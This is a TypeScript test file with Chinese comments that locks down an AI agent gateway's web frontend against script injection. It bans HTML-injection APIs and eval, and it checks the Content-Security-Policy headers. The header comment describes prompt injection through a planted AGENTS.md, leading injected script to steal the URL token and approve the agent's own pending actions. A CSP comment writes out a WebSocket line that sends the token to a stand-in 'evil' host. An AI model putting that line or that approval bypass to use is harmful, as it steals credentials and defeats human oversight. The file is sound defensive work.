import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { Gateway } from "../src/gateway/server.ts";

/**
 * 前端的注入面。
 *
 * 为什么这一层要有守卫：操作面渲染的**全部内容都是 agent 可控的** ——
 * 模型输出、工具结果、bash 命令原文、审批对话里的动作描述。而 agent 本身
 * 是 prompt injection 的直接目标（仓库里埋一个恶意 AGENTS.md 就够）。
 *
 * 后果比一般的 XSS 更重：Phase 1 的 token 走 URL 查询串（已声明的取舍，
 * 见 server.ts 的 #authorized），前端一旦能执行注入的脚本，就能读到
 * location.search 里的 token、连回网关、**批准自己挂起的审批**。
 * 审批门是这个产品的核心卖点，而它的钥匙就在浏览器地址栏里。
 *
 * `web/` 是零构建的原生 JS，不在 tsconfig 的 include 里，也没有 lint ——
 * 这些性质只能靠测试锁住。它们现在都成立，这组测试是防回归的：
 * 将来有人为了渲染 markdown 顺手改成 innerHTML，这里会红。
 */

const REPO = fileURLToPath(new URL("..", import.meta.url));
const WEB = join(REPO, "web");

function webSources(): { file: string; text: string }[] {
	// 递归：index.html 用 <script type="module">，渲染逻辑随时可能拆进子目录，
	// 而「为了渲染 markdown 改用 innerHTML」最可能就发生在那样一个新模块里
	return readdirSync(WEB, { recursive: true, encoding: "utf8" })
		.filter((f) => f.endsWith(".js") || f.endsWith(".html"))
		.map((f) => ({ file: f, text: readFileSync(join(WEB, f), "utf8") }));
}

test("解析假设成立 —— 否则下面几条是空转", () => {
	const sources = webSources();
	assert.ok(sources.length >= 2, `web/ 下只找到 ${sources.length} 个文件`);
	assert.ok(
		sources.some((s) => s.text.includes("textContent")),
		"没扫到 textContent，说明渲染方式变了，这组断言的前提要重新确认",
	);
});

test("不得用 innerHTML 一类的 HTML 注入接口渲染 agent 输出", () => {
	// 模型输出与工具结果都是不可信文本。要渲染 markdown 就得先有
	// 净化层，而不是直接把这道防线拆掉。
	// 这些全是「渲染 markdown」时会自然写出来的写法，都要一起挡住。
	// document.write 后面不加 \b：writeln 也要命中
	const banned =
		/\b(innerHTML|outerHTML|insertAdjacentHTML|setHTMLUnsafe|srcdoc|createContextualFragment|parseFromString)\b|\bdocument\.write/;
	// 不做注释过滤：与下面几条保持一致，且「注释里提到 innerHTML」本身
	// 就该让人停下来看一眼（app.js 里那条说明性注释已相应改写）
	for (const { file, text } of webSources()) {
		assert.ok(!banned.test(text), `${file} 用了 HTML 注入接口 —— agent 输出必须走 textContent`);
	}
});

test("不得引入 URL 型 sink —— agent 可控的值不能进 href/src/属性名", () => {
	// 这些面**当前为空**（web/app.js 一处都没有），在它们出现之前锁住最划算：
	// javascript: URL 与动态属性名都是绕开 textContent 那道防线的现成路径
	const banned = /\.(href|src)\s*=|\bsetAttribute\s*\(|\blocation\.(assign|replace)\s*\(|\bwindow\.open\s*\(/;
	for (const { file, text } of webSources()) {
		if (!file.endsWith(".js")) continue;
		assert.ok(!banned.test(text), `${file} 引入了 URL 型 sink —— 需要先有净化层再放行`);
	}
});

test("不得用 eval / new Function 一类的动态求值", () => {
	const banned = /\b(eval\(|new Function\(|setTimeout\(\s*["'`]|setInterval\(\s*["'`])/;
	for (const { file, text } of webSources()) {
		assert.ok(!banned.test(text), `${file} 含动态求值 —— 注入的字符串会被当代码跑`);
	}
});

test("网关下发的 CSP 真的能拦住 token 外传", async () => {
	// 读真实响应头而不是源码文本：源码里 CSP 是多行拼接，正则抓不全；
	// 更重要的是将来多一条不带 CSP 的响应路径（错误页、304）源码扫描看不出来
	const dir = mkdtempSync(join(tmpdir(), "web-csp-"));
	const gw = new Gateway({
		port: 0,
		host: "127.0.0.1",
		token: "t",
		policyFile: join(REPO, "config/policy.yaml"),
		auditFile: join(dir, "a.jsonl"),
		workspaceRoot: join(dir, "ws"),
		webRoot: join(REPO, "web"),
	});
	const port = await gw.listen();
	try {
		const res = await fetch(`http://127.0.0.1:${port}/index.html`);
		const csp = res.headers.get("content-security-policy");
		assert.ok(csp, "静态响应必须带 CSP");
		assert.match(csp!, /default-src 'self'/);
		assert.ok(!csp!.includes("unsafe-inline"), "unsafe-inline 会让 CSP 对注入的 script 失效");
		assert.ok(!csp!.includes("unsafe-eval"));

		// connect-src 必须限同源。写成 `ws: wss:` 是 scheme-source，匹配**任意主机** ——
		// 注入的脚本一句 new WebSocket("wss://evil/?t="+location.search) 就把 token
		// 送走了，而那正是这个文件存在的理由。
		// 已在浏览器实测：收紧后同源 WS 仍能连（CSP3 的 'self' 匹配同源 ws/wss），
		// 外部 WS 被 block 并在 console 报出违规。
		assert.match(csp!, /connect-src 'self'(;|$)/, "connect-src 不能带 ws:/wss: 这类 scheme-source");
		// form-action 不回落到 default-src，是 connect-src 之外的第二条外传路径
		assert.match(csp!, /form-action 'none'/);
		assert.match(csp!, /base-uri 'none'/);
		assert.equal(res.headers.get("x-frame-options"), "DENY");
	} finally {
		await gw.close();
	}
});

test("页面不含内联脚本 —— CSP 的 default-src 'self' 会拦掉它", () => {
	// 内联脚本被 CSP 拦掉的话，界面会以「某块功能静默失效」的形式坏掉，
	// 排查时很难联想到 CSP
	for (const { file, text } of webSources()) {
		if (!file.endsWith(".html")) continue;
		const inline = /<script(?![^>]*\bsrc=)[^>]*>[\s\S]*?\S[\s\S]*?<\/script>/.test(text);
		assert.ok(!inline, `${file} 含内联脚本，会被自己下发的 CSP 拦掉`);
		assert.ok(!/\son\w+\s*=/.test(text), `${file} 含内联事件处理器（onclick 等），同样会被 CSP 拦掉`);
	}
});
